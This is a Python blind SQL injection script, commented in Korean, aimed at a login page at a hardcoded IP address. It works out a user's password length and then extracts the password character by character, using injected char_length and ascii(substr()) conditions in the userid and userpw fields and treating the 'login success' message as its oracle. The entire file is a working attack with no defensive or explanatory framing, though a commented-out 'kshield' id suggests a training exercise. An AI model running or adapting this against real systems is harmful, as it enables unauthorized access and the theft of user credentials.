# -*- coding: utf-8 -*-
import requests, json

#블라인드 sql 인젝션 할 url
url = 'http://104.197.42.200/member/login_ok.php'
test = "로그인 성공"
#패스워드 길이 구하기
length = 1
while(1):
    injection = "test' and char_length(pw) = {} -- '".format(length) #원하는 id값
    #injection = "kshield' and char_length(pw) = {} -- '".format(length)
    value = "' or char_length(pw) = {} -- '".format(length)
    datas = {
            'userid' : injection,
            'userpw' : value
            }
    #print(datas)
    r = requests.post(url, data = datas) #post 요청
    #print(r.status_code)
    #print(r.text)
    if test.encode() not in r.text.encode('utf-8') :
        length += 1
    else:
        print("길이: " + str(length))
        break

#패스워드 길이를 바탕으로 문자열 알아내기
password = ""
for i in range(length):
    asci = 127
    while(asci > 0):
        injection = "test' and ascii(substr(pw,{},1))={}# '".format(i+1,asci) #원하는 id값
        #injection = "kshield' and ascii(substr(pw,{},1))={}# '".format(i+1,asci)
        value = "' or ascii(substr(pw,{},1))={}# '".format(i+1,asci)
        datas = {
            'userid' : injection,
            'userpw' : value
            }

        r = requests.post(url, data = datas) #post 요청
        #print(r.text)
        if(r.text.find(u"로그인 성공") == -1):
            asci -= 1
        else:
            password += chr(asci)
            break
            
    print("비밀번호: "+ password +", 남은 문자 수: "+str(length-len(password)))
